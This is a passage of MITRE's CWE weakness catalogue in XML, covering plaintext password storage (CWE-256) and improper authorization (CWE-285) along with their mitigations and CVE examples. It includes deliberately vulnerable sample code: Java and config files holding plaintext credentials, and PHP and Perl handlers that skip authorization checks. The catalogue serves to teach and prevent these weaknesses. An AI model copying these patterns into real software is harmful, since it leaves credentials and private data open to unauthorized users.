               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Relationships, Other_Notes, Relationship_Notes, Relevant_Properties, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Related_Attack_Patterns, Relationship_Notes, Relationships, Research_Gaps, Taxonomy_Mappings, Terminology_Notes, Time_of_Introduction, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Other_Notes, Research_Gaps</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Affected_Resources, Causal_Nature, Likelihood_of_Exploit, References, Relationships, Relevant_Properties, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2010-02-16">Path Traversal</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="256" Name="Plaintext Storage of a Password" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>Storing a password in plaintext may result in a system compromise.</Description>
         <Extended_Description>Password management issues occur when a password is stored in plaintext in an application's properties or configuration file. Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="522" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="522" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>Developers sometimes believe that they cannot defend the application from someone who has access to the configuration, but this belief makes an attacker's job easier.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Avoid storing passwords in easily accessible locations.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Consider storing cryptographic hashes of passwords as an alternative to storing in plaintext.</Description>
            </Mitigation>
            <Mitigation>
               <Description>A programmer might attempt to remedy the password management problem by obscuring the password with an encoding function, such as base 64 encoding, but this effort does not adequately protect the password because the encoding can be detected and decoded easily.</Description>
               <Effectiveness>None</Effectiveness>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-57">
               <Intro_Text>The following code reads a password from a properties file and uses the password to connect to a database.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>Properties prop = new Properties();<xhtml:br/>prop.load(new FileInputStream("config.properties"));<xhtml:br/>String password = prop.getProperty("password");<xhtml:br/>DriverManager.getConnection(url, usr, password);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code will run successfully, but anyone who has access to config.properties can read the value of password. If a devious employee has access to this information, they can use it to break into the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-58">
               <Intro_Text>The following code reads a password from the registry and uses the password to create a new network credential.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String password = regKey.GetValue(passKey).toString();<xhtml:br/>NetworkCredential netCred = new NetworkCredential(username,password,domain);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in plaintext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a plaintext username / password pair.</Body_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>
                     <xhtml:div>
                        <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     </xhtml:div>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in plaintext.</Body_Text>
               <Example_Code Nature="bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:br/>&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;<xhtml:br/>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid CWE-260 and CWE-13.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Password Management</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-207"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Description, Modes_of_Introduction, Other_Notes, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2008-01-30">Plaintext Storage</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="285" Name="Improper Authorization" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action.</Description>
         <Extended_Description>
            <xhtml:p>Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.</xhtml:p>
            <xhtml:p>When access control checks are not applied consistently - or not at all - users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Often"/>
            <Technology Name="Database Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>AuthZ</Term>
               <Description>"AuthZ" is typically used as an abbreviation of "authorization" within the web application security community. It is also distinct from "AuthC," which is an abbreviation of "authentication." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>
                  <xhtml:p>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</xhtml:p>
                  <xhtml:p>A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>
                  <xhtml:p>Authorization weaknesses may arise when a single-user application is ported to a multi-user environment.</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>An attacker could read sensitive data, either by reading the data directly from a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to read the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>An attacker could modify sensitive data, either by writing the data directly to a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to write the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could gain privileges by modifying or reading critical data directly, or by accessing insufficiently-protected, privileged functionality.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Automated dynamic analysis may find many or all possible interfaces that do not require authorization, but manual analysis is required to determine if the lack of authorization violates business logic</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.</xhtml:p>
               </Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) to enforce the roles at the appropriate boundaries.</xhtml:p>
                  <xhtml:p>Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that you perform access control checks related to your business logic. These checks may be different than the access control checks that you apply to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.</xhtml:p>
                  <xhtml:p>One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Phase>Installation</Phase>
               <Description>Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a "default deny" policy when defining these ACLs.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-95">
               <Intro_Text>This function runs an arbitrary SQL query on a given database, returning the result of the query.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>function runEmployeeQuery($dbName, $name){<xhtml:div style="margin-left:10px;">
                        <xhtml:div>mysql_select_db($dbName,$globalDbHandle) or die("Could not open Database".$dbName);<xhtml:div>
                              <xhtml:i>//Use a prepared statement to avoid CWE-89</xhtml:i>
                           </xhtml:div>
                           <xhtml:br/>$preparedStatement = $globalDbHandle-&gt;prepare('SELECT * FROM employees WHERE name = :name');<xhtml:br/>$preparedStatement-&gt;execute(array(':name' =&gt; $name));<xhtml:br/>return $preparedStatement-&gt;fetchAll();</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:div>
                        <xhtml:i>/.../</xhtml:i>
                     </xhtml:div>
                     <xhtml:br/>$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);</xhtml:div>
               </Example_Code>
               <Body_Text>While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-96">
               <Intro_Text>The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>sub DisplayPrivateMessage {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>my($id) = @_;<xhtml:br/>my $Message = LookupMessageObject($id);<xhtml:br/>print "From: " . encodeHTML($Message-&gt;{from}) . "&lt;br&gt;\n";<xhtml:br/>print "Subject: " . encodeHTML($Message-&gt;{subject}) . "\n";<xhtml:br/>print "&lt;hr&gt;\n";<xhtml:br/>print "Body: " . encodeHTML($Message-&gt;{body}) . "\n";</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>
                     <xhtml:br/>my $q = new CGI;<xhtml:div>
                        <xhtml:i># For purposes of this example, assume that CWE-309 and</xhtml:i>
                     </xhtml:div>
                     <xhtml:div>
                        <xhtml:i># CWE-523 do not apply.</xhtml:i>
                     </xhtml:div>
                     <xhtml:br/>if (! AuthenticateUser($q-&gt;param('username'), $q-&gt;param('password'))) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>ExitError("invalid username or password");</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>
                     <xhtml:br/>my $id = $q-&gt;param('id');<xhtml:br/>DisplayPrivateMessage($id);</xhtml:div>
               </Example_Code>
               <Body_Text>While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users.</Body_Text>
               <Body_Text>One way to avoid this problem would be to ensure that the "to" field in the message object matches the username of the authenticated user.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-3168</Reference>
               <Description>Web application does not restrict access to admin scripts, allowing authenticated users to reset administrative passwords.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3168</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2960</Reference>
               <Description>Web application does not restrict access to admin scripts, allowing authenticated users to modify passwords of other users.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2960</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3597</Reference>
               <Description>Web application stores database file under the web root with insufficient access control (CWE-219), allowing direct request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3597</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2282</Reference>
               <Description>Terminal server does not check authorization for guest access.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2282</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3230</Reference>
               <Description>Database server does not use appropriate privileges for certain sensitive operations.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3230</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2213</Reference>
               <Description>Gateway uses default "Allow" configuration for its authorization settings.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0034</Reference>
               <Description>Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0034</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6123</Reference>
               <Description>Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6123</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5027</Reference>
               <Description>System monitoring software allows users to bypass authorization by creating custom forms.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5027</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-7109</Reference>
